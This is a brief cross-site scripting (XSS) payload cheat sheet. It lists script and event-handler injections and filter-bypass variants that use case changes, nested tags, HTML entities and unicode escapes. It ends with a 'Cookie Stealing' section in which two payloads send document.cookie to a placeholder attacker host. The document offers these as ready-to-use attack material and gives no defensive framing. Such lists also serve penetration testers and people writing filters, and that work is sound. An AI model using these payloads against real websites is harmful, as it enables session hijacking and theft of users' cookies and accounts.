# XSS Reference

## Basic Payloads
```html
<!-- Basic -->
<script>alert(1)</script>
<script>alert(document.cookie)</script>

<!-- Event handlers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>

<!-- Without parentheses -->
<img src=x onerror=alert`1`>
<svg/onload=alert`1`>
```

## Filter Bypass
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Nested tags -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- HTML entities -->
<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Unicode -->
<script>\u0061lert(1)</script>
```

## Cookie Stealing
```html
<script>new Image().src="http://attacker/?c="+document.cookie</script>
<img src=x onerror="fetch('http://attacker/?c='+document.cookie)">
```
